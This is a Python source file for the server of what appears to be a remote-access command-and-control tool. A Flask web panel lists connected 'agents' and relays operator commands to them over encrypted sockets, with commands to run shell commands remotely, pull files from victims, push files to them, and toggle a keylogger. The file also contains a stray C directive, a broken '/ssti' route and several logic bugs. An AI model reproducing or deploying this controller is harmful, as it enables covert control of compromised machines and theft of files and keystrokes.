#define PY_SSIZE_T_CLEAN
import threading,time
from cryptography.fernet import Fernet
import socket
import os
from flask import *
from pathlib import Path
from base64 import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def cbc_encrypt(plaintxt,key,iv):
    encrypted = AES.new(key, AES.MODE_CBC, iv=iv)
    padded_plaintxt = pad(plaintxt.encode(), AES.block_size, style='pkcs7')
    cipher = encrypted.encrypt(padded_plaintxt)
    return cipher

ip = '127.0.0.1'
port = 1234
key = b'YELLOW SUBMARINE'
iv = b'\x00' * 16
THREADS = []
thread_index = 0
CMD_INPUT = ['']
CMD_OUTPUT = ['']
IPS = []
activecon = []

for i in range(20):
	CMD_INPUT.append('')
	CMD_OUTPUT.append('')
	IPS.append('')
	activecon.append(0)

app = Flask(__name__)

def handlecon(c_socket,address,thread_index):
	global CMD_OUTPUT
	global CMD_INPUT
	global THREADS
	global activecon
	print("Got connection from: {}".format(address))
	activecon[thread_index] = 1
	print("CMD INOUT OUTSIDE LOOP", CMD_INPUT[thread_index])
	i=0
	while CMD_INPUT[thread_index] != 'quit':
		print("i:",i)
		print("CMD INOUT INSIDE LOOP", CMD_INPUT[thread_index])
		msg = c_socket.recv(2048).decode()
		print("\nHandling connection... thread_index = {}".format(thread_index))
		CMD_OUTPUT[thread_index] = msg
		print("message recieved in CMD_OUTPUT (command 1): {}".format(CMD_OUTPUT[thread_index]))
		#CMD_INPUT[thread_index] = msg

		while True:
			
			if CMD_INPUT[thread_index] != '':
				# download filename
				if CMD_INPUT[thread_index].split(" ")[0] == 'download':	
					
					filename = CMD_INPUT[thread_index].split(" ")[1].split("/")[-1]
					cmd = CMD_INPUT[thread_index]
					msg = cbc_encrypt(cmd,key,iv)
					c_socket.send(msg)
					contents = c_socket.recv(1024 * 1000000)
					print(contents)
					print(type(contents))
					print("\nDownloading file: {}\n".format(filename))
					f = open('./outputs/' + filename, 'wb')
					f.write(contents)
					f.close()
					print("File Transfer Server")
					CMD_OUTPUT[thread_index] = 'File Transfered Successfully!'
					CMD_INPUT[thread_index] =''
					

				elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':	
					
					cmd = CMD_INPUT[thread_index]
					print("BEFORE UPLOAD COMMAND " , CMD_INPUT[thread_index])
					msg = cbc_encrypt(cmd,key,iv)
					c_socket.send(msg)

					filename = CMD_INPUT[thread_index].split(" ")[1]
					filesize = CMD_INPUT[thread_index].split(" ")[2]
					f = open('./outputs/' + filename, 'rb')
					
					contents = f.read()
					print(contents)
					f.close()
					c_socket.send(contents)
					msg = c_socket.recv(2048).decode()
					if (msg == 'got file'):
						CMD_OUTPUT[thread_index] = 'File Sent Successfully!'
					else:
						CMD_OUTPUT[thread_index] = 'Error Occurred sending file...'
					CMD_INPUT[thread_index] = ''
			
				elif CMD_INPUT[thread_index] == 'keylog on' or CMD_INPUT[thread_index] == 'keylog off':
					cmd = CMD_INPUT[thread_index]
					msg = cbc_encrypt(cmd,key,iv)
					c_socket.send(msg)
					msg = c_socket.recv(2048).decode()
					CMD_OUTPUT[thread_index] = msg
					'''
				elif CMD_INPUT[thread_index] == 'keylog off':
					cmd = CMD_INPUT[thread_index]
					msg = cbc_encrypt(cmd,key,iv)
					c_socket.send(msg)
					msg = c_socket.recv(2048).decode()
					CMD_OUTPUT[thread_index] = msg
					'''
				else:
					msg = CMD_INPUT[thread_index]
					msg = cbc_encrypt(msg,key,iv)
					print("Im in else: ",msg)
					c_socket.send(msg)
					print(msg)
					msg = c_socket.recv(2048).decode()
					CMD_OUTPUT[thread_index] = msg
				if CMD_INPUT[thread_index] == 'quit':
					break	
					
				CMD_INPUT[thread_index] = ''
		break


	print("\n\nbreak statement encountered!\n\n")

	c_socket.close()
	activecon[thread_index] = 0

	print("closing connection for thread_index {}".format(thread_index))




def server_socket():
	global THREADS
	global IPS
	s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s_socket.bind((ip, port))
	s_socket.listen(5)
	while True:
		print('connection not accepted yet')
		c_socket,address = s_socket.accept()
		print('connection accepted!')

		t = threading.Thread(target=handlecon,args=(c_socket,address,len(THREADS)))
		t.start()
		THREADS.append(t)
		print("\nlenth of array THREADS is: {}\n".format(len(THREADS)))
		thread_index = len(THREADS)
		
		IPS[thread_index] = address
		



@app.route("/<agentname>/executecmd")
def executecmd(agentname):
	return render_template("execute.html", name=agentname)

@app.route("/<agentname>/execute", methods=['GET','POST'])
def execute(agentname):

	if request.method == 'POST':
		cmd = request.form.get('command')
		for i in THREADS:
			if agentname in i.name:
				req_index = THREADS.index(i)
		CMD_INPUT[req_index] =cmd
		print("required index is {}".format(req_index))
		time.sleep(1)
		cmdoutput = CMD_OUTPUT[req_index]
		
		#if cmdoutput.split(" ")[0] == 'keys':
		#	sleep(1)

        
		return render_template('execute.html', cmdoutput=cmdoutput, name=agentname)


@app.route("/ssti")
def ssti(name):
	render_template("sample.html", username = name)

@app.route("/")
def home():
	return render_template("index.html")

@app.route("/agents")
def agents():
	return render_template("agents.html",threads=THREADS,ips=IPS, activecon=activecon)

@app.before_first_request
def init_server():
	s1 = threading.Thread(target=server_socket)
	s1.start()



if __name__=='__main__':
	app.run(debug=True)